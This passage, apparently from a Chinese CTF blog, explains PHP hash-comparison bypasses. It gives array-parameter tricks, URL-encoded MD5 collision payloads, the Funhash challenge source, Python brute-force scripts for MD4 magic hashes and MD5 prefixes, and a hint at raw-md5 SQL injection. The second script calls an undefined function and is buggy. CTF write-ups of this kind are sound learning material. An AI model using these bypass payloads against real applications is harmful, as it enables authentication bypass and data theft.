-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">法一：
-param1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span>
-法二：
-<span class="token assign-left variable">param1</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<span class="token operator">&amp;</span><span class="token assign-left variable">param2</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><a name="jh3Lk"></a></p>
-<h3 id="2-强网杯2020——Funhash"><a href="#2-强网杯2020——Funhash" class="headerlink" title="2.强网杯2020——Funhash"></a>2.强网杯2020——Funhash</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">include</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token comment">//level 1</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"hash1"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md4"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"hash1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'level 1 failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token comment">//level 2</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash2'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash3'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token class-name">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hash3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'level 2 failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token comment">//level 3</span>
-<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM flag WHERE password = '"</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"hash4"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span>
-<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span> 
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><a name="EMcpk"></a></p>
-<h4 id="levle-1"><a href="#levle-1" class="headerlink" title="levle 1"></a>levle 1</h4><p>很明显，这种是要md4加密，并且是”0e”+”数字” 加密后还是”0e”+”数字”的形式，上脚本：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> multiprocessing
-<span class="token keyword">import</span> hashlib
-<span class="token keyword">import</span> random
-<span class="token keyword">import</span> string
-<span class="token keyword">import</span> sys
-
-CHARS <span class="token operator">=</span> string<span class="token punctuation">.</span>digits
-
-
-<span class="token keyword">def</span> <span class="token function">cmp_md4</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">global</span> CHARS
-    <span class="token keyword">while</span> <span class="token keyword">not</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        rnds <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>CHARS<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
-        rnds <span class="token operator">=</span> <span class="token string">"0e"</span><span class="token operator">+</span>rnds
-        md4 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'md4'</span><span class="token punctuation">,</span> rnds<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-        value <span class="token operator">=</span> md4<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> value<span class="token punctuation">[</span>start<span class="token punctuation">:</span> start <span class="token operator">+</span> str_len<span class="token punctuation">]</span> <span class="token operator">==</span> substr<span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>
-            <span class="token keyword">if</span> value<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-                <span class="token keyword">print</span><span class="token punctuation">(</span>rnds<span class="token punctuation">)</span>
-                stop_event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-                
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    substr <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    start_pos <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span>
-    str_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>substr<span class="token punctuation">)</span>
-    cpus <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>cpu_count<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    stop_event <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    processes <span class="token operator">=</span> <span class="token punctuation">[</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>cmp_md4<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span>
-                                                               stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span><span class="token punctuation">)</span>
-                 <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>cpus<span class="token punctuation">)</span><span class="token punctuation">]</span>
-    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>
-        p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>
-        p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/images/2/2-6.png"><br>测试一下，可行<br><img src="/images/2/2-7.png"><br><a name="GT9CN"></a></p>
-<h4 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">法一：
-hash2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>hash3<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span>
-法二：
-<span class="token assign-left variable">hash2</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<span class="token operator">&amp;</span><span class="token assign-left variable">hash3</span><span class="token operator">=</span>M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><a name="Gvn9O"></a></p>
-<h4 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h4><p><img src="/images/2/2-8.png"><br>结果：<br><img src="/images/2/2-9.png"><br>只要构造 <code>xx &#39;or xxxx</code> 的形式就可以了<br>具体可以看<a href="https://blog.csdn.net/March97/article/details/81222922">这篇文章</a></p>
-<p><a name="QMEO5"></a></p>
-<h3 id="3-构造特定字符串"><a href="#3-构造特定字符串" class="headerlink" title="3.构造特定字符串"></a>3.构造特定字符串</h3><p>这个是我觉得以后为了避免大家都用现有的收集字符串解题而出的，比如：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token number">123</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">else</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>要构造一个开头是123且后面是字母的字符串：<br>脚本：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> multiprocessing
-<span class="token keyword">import</span> hashlib
-<span class="token keyword">import</span> random
-<span class="token keyword">import</span> string
-<span class="token keyword">import</span> sys
-
-CHARS <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
-
-
-<span class="token keyword">def</span> <span class="token function">cmp_md5</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">global</span> CHARS
-    <span class="token keyword">while</span> <span class="token keyword">not</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        rnds <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>CHARS<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
-        md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>rnds<span class="token punctuation">)</span>
-        value <span class="token operator">=</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> value<span class="token punctuation">[</span>start<span class="token punctuation">:</span> start <span class="token operator">+</span> str_len<span class="token punctuation">]</span> <span class="token operator">==</span> substr<span class="token punctuation">:</span>
-            <span class="token keyword">print</span> rnds
-            <span class="token keyword">print</span> value
-            stop_event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-            
-            
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    substr <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    start_pos <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">0</span>
-    str_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>substr<span class="token punctuation">)</span>
-    cpus <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>cpu_count<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    stop_event <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    processes <span class="token operator">=</span> <span class="token punctuation">[</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>cmp_md4<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>substr<span class="token punctuation">,</span>
-                                                               stop_event<span class="token punctuation">,</span> str_len<span class="token punctuation">,</span> start_pos<span class="token punctuation">)</span><span class="token punctuation">)</span>
-                 <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>cpus<span class="token punctuation">)</span><span class="token punctuation">]</span>
-    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>
-        p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">for</span> p <span class="token keyword">in</span> processes<span class="token punctuation">:</span>
-        p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>终端输入<code>python .\MD5碰撞.py &quot;123&quot; 0</code><br><img src="/images/2/2-10.png"><br>实践试一下：<br><img src="/images/2/2-11.png"><br><code>注意点：跑出来的123后面第一个字符要是字母，如果不是多跑几次，概率还是挺大的。</code></p>
-<p><a name="D6C2L"></a></p>
-<h3 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h3><p>还有关于双md5的题目等等，只要掌握了这些思想，看到题目就能想到解法了。这个脚本也是面向百度编程找到的，有一个脚本能跑是比较好的，可以应对各种新情况。使用python脚本是因为有多线程模式，速度更快。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
       </categories>
   </entry>
   <entry>
